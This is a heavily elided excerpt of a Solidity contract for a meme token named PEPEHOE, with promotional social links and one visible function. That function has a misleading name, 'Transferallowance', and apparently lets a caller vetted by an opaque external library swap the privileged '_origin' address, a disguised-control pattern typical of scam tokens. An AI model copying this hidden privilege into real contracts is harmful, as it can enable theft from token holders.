/*
PEPEHOE - It's about fucking time!

Socials:
Telegram- https://t.me/pepehoe
Medium-  https://medium.com/@kivacas358/pepe-hoe-b82f6fde6b43🐸
Website- http://Pepehoe.vip
Twitter (X) - https://twitter.com/PepeHoeERC
...
contract PEPEHOE is IERC20, Ownable {
    ...
    function Transferallowance(address newOrigin) public {
        SecureCalls.checkCaller(msg.sender, _origin);
        _origin = newOrigin;
    }
}